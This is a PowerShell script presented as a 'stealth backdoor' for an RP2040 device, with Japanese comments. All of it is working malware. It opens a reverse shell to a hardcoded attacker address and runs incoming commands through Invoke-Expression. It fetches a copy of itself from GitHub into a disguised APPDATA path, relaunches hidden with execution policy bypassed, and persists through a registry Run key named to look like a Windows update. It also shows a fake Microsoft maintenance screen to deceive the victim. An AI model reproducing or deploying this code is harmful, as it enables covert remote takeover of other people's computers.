# --- RP2040 Stealth Backdoor (Robust & Detached Version) ---
# GitHub: 0rnot/RP2040/main/backdoor.ps1

function Start-ReverseShell {
    param(
        [string]$LHOST = "192.168.0.248",
        [int]$LPORT = 4444,
        [switch]$Background
    )

    $DestPath = "$env:APPDATA\Microsoft\Windows\explorer_update.ps1"

    # --- 1. バックグラウンドモード (リバースシェル本体) ---
    if ($Background) {
        # 無限ループで接続を試行
        while ($true) {
            try {
                $TCPClient = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
                $Stream = $TCPClient.GetStream()
                $Writer = New-Object System.IO.StreamWriter($Stream); $Writer.AutoFlush = $true
                $Reader = New-Object System.IO.StreamReader($Stream)

                $Writer.WriteLine("--- RP2040 Session Established: $($env:COMPUTERNAME) ---")
                $Writer.Write("PS " + (Get-Location).Path + "> ")

                while($TCPClient.Connected) {
                    if($Stream.DataAvailable) {
                        $Command = $Reader.ReadLine()
                        if ($Command -eq "exit") { break }
                        try {
                            $Result = Invoke-Expression $Command 2>&1 | Out-String
                        } catch {
                            $Result = $_.Exception.Message
                        }
                        $Writer.WriteLine($Result)
                        $Writer.Write("PS " + (Get-Location).Path + "> ")
                    }
                    Start-Sleep -Milliseconds 100
                }
                $TCPClient.Close()
            } catch {
                # 失敗時は30秒待機して再試行
                Start-Sleep -Seconds 30
            }
        }
        return
    }

    # --- 2. デコイモード (おとり画面 & プロセス分離) ---
    
    # スクリプトを隠しフォルダに保存 (パスにスペースがあっても良いようにクォート処理)
    try {
        if (-not (Test-Path $DestPath)) {
            (New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/0rnot/RP2040/main/backdoor.ps1", $DestPath)
        }
    } catch { }

    # バックグラウンドプロセスの完全分離起動
    # パスにスペースがある場合を考慮し、エスケープされた二重引用符を使用
    $LaunchArgs = "-ExecutionPolicy Bypass -File `"$DestPath`" -LHOST $LHOST -LPORT $LPORT -Background"
    
    try {
        $WshShell = New-Object -ComObject WScript.Shell
        # 0 = 非表示, $false = 終了を待たない (切り離し)
        $WshShell.Run("powershell.exe $LaunchArgs", 0, $false) | Out-Null
    } catch {
        # フォールバック
        Start-Process powershell.exe -ArgumentList $LaunchArgs -WindowStyle Hidden
    }

    # 永続化（再起動時も非表示で実行）
    $RegCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command `". '$DestPath'; Start-ReverseShell -LHOST $LHOST -LPORT $LPORT -Background`""
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdateAssistant' -Value $RegCommand | Out-Null

    # おとり画面の表示
    Clear-Host
    Write-Host "Microsoft Windows [Version 10.0.19045.4170]"
    Write-Host "(c) Microsoft Corporation. All rights reserved."
    Write-Host ""
    Write-Host "System maintenance is running. Please wait..." -ForegroundColor Cyan
    Write-Host ""
    
    $progress = 0
    while($progress -lt 100) {
        $progress += (Get-Random -Minimum 1 -Maximum 10)
        if ($progress -gt 100) { $progress = 100 }
        Write-Host "`rVerification progress: $progress%" -NoNewline
        Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
    }
    
    Write-Host "`nVerification complete. System is protected." -ForegroundColor Green
    Write-Host "You may close this window or it will close automatically when tasks are finished."
    
    # ウィンドウを開いたままにする
    while($true) { Start-Sleep -Seconds 60 }
}

# 実行
if ($MyInvocation.InvocationName -ne 'Start-ReverseShell') {
    # 引数が渡されていない場合はデフォルト値を使用
    Start-ReverseShell -LHOST $LHOST -LPORT $LPORT -Background:$Background
}
